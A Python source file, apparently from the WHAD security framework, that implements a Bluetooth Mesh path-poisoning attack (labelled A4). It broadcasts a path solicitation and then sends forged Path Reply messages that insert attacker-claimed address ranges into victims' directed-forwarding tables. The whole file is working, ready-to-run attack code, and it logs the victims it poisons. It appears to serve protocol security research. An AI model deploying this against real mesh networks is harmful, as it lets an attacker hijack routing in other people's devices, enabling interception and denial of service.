"""
Attacker object for the Bluetooth Mesh path poisoning via path solicitation (A4)
"""

import logging

from dataclasses import dataclass, field
from whad.btmesh.attacker import Attacker
from whad.scapy.layers.btmesh import (
    BTMesh_Upper_Transport_Control_Path_Request,
    UnicastAddr,
    BTMesh_Upper_Transport_Control_Path_Reply,
    BTMesh_Upper_Transport_Control_Path_Request_Solicitation,
)
from whad.btmesh.stack.utils import MeshMessageContext
from whad.btmesh.stack.constants import DIRECTED_FORWARDING_CREDS

from time import sleep
from random import uniform
from threading import Thread, Event
from copy import copy

logger = logging.getLogger(__name__)


@dataclass
class PathPoisonSolicitationConfiguration:
    """Configuration for the PathPoisonSolicitation attack

    :param trigger_addresses: The list of addresses we know the victim nodes have a path to.
    :param poison_adresses: The list of addresses to add to the solicitation message to create poisoned path. Each address will poison itself and its range + 255 * 2.
    :param net_key_index: The net_key_index to use to send the control messages.
    """

    trigger_addresses: list[int] = field(default_factory=lambda: [0x0003])
    poison_adresses: list[int] = field(default_factory=lambda: [0x0001])
    net_key_index: int = 0


class PathPoisonSolicitationAttacker(Attacker):

    name = "PathPoisonSolicitation"
    description = "Tries to poison DF paths via Path Solicitation to force victims to create paths that we poison. (A4)"
    need_provisioned_node = True

    def __init__(self, connector, configuration=PathPoisonSolicitationConfiguration()):
        """PathPoisonSolicitation object. Requires a provisioned node.

        For now, source address on Network layer is local's node primary address for simplicity.

        :param connector: The btmesh connector to use
        :type connector: BTMesh
        :param configuration: The configuration to use
        :type configuration: LinkCloserConfiguration
        """

        # Dict of poisoned victim : poison address (list) to keep track
        self.results = {}

        super().__init__(connector, configuration)

    def _setup(self):
        """
        Setup the Upper Transport layer for the attack.
        """
        self._connector.stop()
        upper_transport = self._connector.main_stack.get_layer("upper_transport")
        upper_transport.register_custom_handler(
            BTMesh_Upper_Transport_Control_Path_Request, self.on_path_request
        )  # register our attack_callback in in upper_transport layer
        self._connector.start()
        self._is_setup = True

    def restore(self):
        """
        Restores the Upper Transport layer back to normal.
        """
        if self._is_setup:
            self._connector.stop()
            upper_transport = self._connector.main_stack.get_layer("upper_transport")
            upper_transport.unregister_custom_handler(
                BTMesh_Upper_Transport_Control_Path_Request
            )
            self._connector.start()
            self._is_setup = False

    def _attack_runner(self):
        self._is_attack_running = True

        # Check validity of parameters
        if (
            self._connector.profile.get_net_key(self._configuration.net_key_index)
            is None
        ):
            self._success = False
            self.is_attack_running = False
            return

        # if not at least a single address in configuration, we cannot send a valid solicitation message.
        if (
            len(self._configuration.poison_adresses)
            + len(self._configuration.trigger_addresses)
            < 1
        ):
            self._success = False
            self.is_attack_running = False
            return

        # Send the BTMesh_Upper_Transport_Control_Path_Request_Solicitation message
        pkt = BTMesh_Upper_Transport_Control_Path_Request_Solicitation(
            addr_list=list(
                set(
                    self._configuration.trigger_addresses
                    + self._configuration.poison_adresses
                )
            )
        )
        ctx = MeshMessageContext()
        ctx.creds = DIRECTED_FORWARDING_CREDS
        ctx.src_addr = self._connector.profile.get_primary_element_addr()
        ctx.dest_addr = 0xFFFB  # all directed forwading nodes
        ctx.ttl = 0x7F
        ctx.is_ctl = True
        ctx.net_key_id = self._configuration.net_key_index

        upper_transport = self._connector.main_stack.get_layer("upper_transport")
        upper_transport.send_control_message(
            (
                pkt,
                ctx,
            )
        )

        return self._success

    def launch(self, asynch=True):
        """
        Launches the PathPoisonSolicitation attack. asynch is advised

        :param asynch [TODO:type]: [TODO:description]
        """
        super().launch(asynch=asynch)

    def on_path_request(self, message):
        """
        Handler of a BTMesh_Upper_Transport_Control_Path_Request message from our attack.
        Proceeds with the poisoning of the victim's forwarding table with a BTMesh_Upper_Transport_Control_Path_Reply

        :param message [TODO:type]: [TODO:description]
        """
        pkt, ctx = message
        if pkt.destination in self._configuration.poison_adresses:
            resp_ctx = MeshMessageContext()
            resp_ctx.creds = DIRECTED_FORWARDING_CREDS
            resp_ctx.src_addr = self._connector.profile.get_primary_element_addr()
            resp_ctx.dest_addr = ctx.src_addr  # all directed forwading nodes
            resp_ctx.ttl = 0
            resp_ctx.is_ctl = True
            resp_ctx.net_key_id = ctx.net_key_id

            # Check the value of path_target to evaluate the ranges to send

            # if 7FFF, we ignore, cannot poison with this address
            if pkt.destination == 0x7FFF:
                return False
            # no dependency here
            elif (pkt.destination + 0xFF) > 0x7FFF:
                resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
                    unicast_destination=1,
                    on_behalf_of_dependent_target=0,
                    confirmation_request=0,
                    path_origin=pkt.path_origin_unicast_addr_range.range_start,
                    path_origin_forwarding_number=pkt.path_origin_forwarding_number,
                    path_target_unicast_addr_range=UnicastAddr(
                        length_present=1,
                        range_start=pkt.destination,
                        range_length=(0x7FFF - pkt.destination + 0xFF) & 0xFF,
                    ),
                )
            else:
                resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
                    unicast_destination=1,
                    on_behalf_of_dependent_target=1,
                    confirmation_request=0,
                    path_origin=pkt.path_origin_unicast_addr_range.range_start,
                    path_origin_forwarding_number=pkt.path_origin_forwarding_number,
                    path_target_unicast_addr_range=UnicastAddr(
                        length_present=1, range_start=pkt.destination, range_length=0xFF
                    ),
                    dependent_target_unicast_addr_range=UnicastAddr(
                        length_present=1,
                        range_length=(0x7FFF - pkt.destination + 0xFF + 0xFF) & 0xFF,
                        range_start=pkt.destination + 0xFF,
                    ),
                )

            upper_transport = self._connector.main_stack.get_layer("upper_transport")
            upper_transport.send_control_message(
                (
                    resp_pkt,
                    resp_ctx,
                )
            )

            if pkt.path_origin_unicast_addr_range.range_start in self.results.keys():
                self.results[pkt.path_origin_unicast_addr_range.range_start].append(
                    pkt.destination
                )
            else:
                self.results[pkt.path_origin_unicast_addr_range.range_start] = [
                    pkt.destination
                ]
            self._success = True
            return False

    def show_result(self):
        """Function implemented in each Attacker to display the result of the attack"""
        if self._is_attack_running:
            print("The PathPoisonSolicitation attack is still runnning asynchnously.")
            if self._success:
                self._show_dict_result()
        elif self._success:
            print(
                "The PathPoisonSolicitation attack was probably a success, need to check the poisoning by checking forwarding table or sending messages from the victim."
            )
            self._show_dict_result()
        else:
            print(
                "PathPoisonSolicitation attack did not run once or failed. Messages might have not been received or no victims have trigger addreses that they have a path to."
            )

    def _show_dict_result(self):
        for victim, poison_adresses in self.results.items():
            print(
                "Victim at address %x was poisoned with : %s"
                % (victim, str([hex(addr) for addr in poison_adresses]))
            )
